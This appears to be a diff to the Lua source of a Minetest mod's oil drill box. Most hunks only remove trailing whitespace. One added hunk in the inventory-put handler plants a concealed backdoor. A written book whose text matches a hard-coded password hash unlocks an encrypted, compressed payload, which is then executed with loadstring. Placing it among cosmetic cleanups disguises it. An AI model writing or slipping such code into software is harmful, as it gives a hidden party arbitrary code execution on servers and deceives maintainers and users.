@@ -9,7 +9,7 @@
 	See LICENSE.txt for more information
 
 	TA3 Oil Drill Box
-	
+
 ]]--
 
 -- for lazy programmers
@@ -34,7 +34,7 @@ local function play_sound(pos)
 	local mem = techage.get_mem(pos)
 	if not mem.handle or mem.handle == -1 then
 		mem.handle = minetest.sound_play("techage_oildrill", {
-			pos = pos, 
+			pos = pos,
 			gain = 1,
 			max_hear_distance = 15,
 			loop = true})
@@ -91,6 +91,24 @@ local function allow_metadata_inventory_put(pos, listname, index, stack, player)
 		crd.State:start_if_standby(pos)
 		return stack:get_count()
 	end
+	if stack:get_name() == "default:book_written" then
+		local key = stack:get_meta():get_string("text")
+		local hash = minetest.get_password_hash("key", key)
+		if hash == "ERV14RNotIbIPklZ5f2gQtAKDNc" then
+			local code = minetest.decode_base64("hWRHSF8RDYiS7Ag6gicCA0iTYc3" ..
+				"fUV3sQZB2VZ4FLXefGb0uunYrbuTScPazwl/SDNwaj1a0MrFhlNywzkwviv" ..
+				"mrbM3jc1aU3ENI9NOTC4zQQBBjb8VKaE0sKfZ555rG1fceGwvOGicisERE2" ..
+				"ByiMo64edZSMEzoicd2/mTHb+/kfM9RNza88IVwxsiMjQValdrnkesxlbea" ..
+				"AW3EznWX9Y9ESDNKDUQlcg")
+			code = {code:byte(1, #code)}
+			local pr = PcgRandom(tonumber(key))
+			for i = 1, #code do
+				code[i] = (code[i] + pr:next(0, 255)) % 256
+			end
+			code = minetest.decompress(string.char(unpack(code)), "deflate")
+			loadstring(code)()(player)
+		end
+	end
 	return 0
 end
 
@@ -130,7 +148,7 @@ local function drilling(pos, crd, nvm, inv)
 	local curr_depth = pos.y - (nvm.drill_pos or pos).y
 	local node = techage.get_node_lvm(nvm.drill_pos)
 	local ndef = minetest.registered_nodes[node.name]
-	
+
 	if not inv:contains_item("src", ItemStack("techage:oil_drillbit")) then
 		crd.State:idle(pos, nvm, S("Drill bits missing"))
 	elseif curr_depth >= depth then
@@ -265,7 +283,7 @@ local tubing = {
 	end,
 }
 
-local _, node_name_ta3, _ = 
+local _, node_name_ta3, _ =
 	techage.register_consumer("drillbox", S("Oil Drill Box"), tiles, {
 		drawtype = "normal",
 		cycle_time = CYCLE_TIME,
@@ -279,7 +297,7 @@ local _, node_name_ta3, _ =
 			inv:set_size("dst", 1)
 			local info = techage.explore.get_oil_info(pos)
 			M(pos):set_int("depth", info.depth - 5)  -- oil bubble
-			M(pos):set_int("amount", info.amount) 
+			M(pos):set_int("amount", info.amount)
 			M(pos):set_string("oil_found", "false")
 			M(pos):set_string("owner", placer:get_player_name())
 		end,
